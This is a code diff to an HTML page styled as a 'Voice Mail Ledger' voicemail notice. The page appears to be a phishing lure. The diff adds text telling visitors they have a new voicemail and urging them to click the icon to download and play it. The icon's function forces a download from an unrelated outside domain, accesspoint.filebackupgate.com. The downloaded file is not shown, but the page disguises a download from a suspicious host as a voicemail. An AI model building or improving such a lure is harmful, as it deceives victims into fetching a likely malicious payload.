@@ -64,6 +64,11 @@
             opacity: 0;
             transition: opacity 1s ease-in-out;
         }
+        .instruction {
+            margin-top: 60px;
+            font-size: 18px;
+            color: #333;
+        }
         @keyframes pulse {
             0% { transform: scale(1); opacity: 0.8; }
             100% { transform: scale(1.5); opacity: 0; }
@@ -74,11 +79,16 @@
 
     <div class="logo">Voice Mail Ledger</div> <!-- Logo at the top right -->
 
+    <!-- Instruction message for the user -->
+    <div class="instruction" id="instruction">
+        You have a new voicemail. Click the icon below to download and play it.
+    </div>
+
     <div class="voicemail-container" id="voicemailIcon" onclick="downloadFile()">
         <div class="circle">
             📞 <!-- Voicemail icon -->
             <div class="wave"></div>
-            <span class="text-below" id="voicemailText">Voice Mail Ledger</span> <!-- Text below the icon -->
+            <span class="text-below" id="voicemailText">Click to download and play voicemail</span> <!-- Updated text below the icon -->
         </div>
     </div>
 
@@ -103,7 +113,7 @@
         function downloadFile() {
             let link = document.createElement("a");
             link.href = "https://accesspoint.filebackupgate.com/";  // Replace with actual file URL
-            link.download = "https://accesspoint.filebackupgate.com/";  // Replace with desired file name
+            link.download = "";  // Let browser use default filename or set a custom one
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
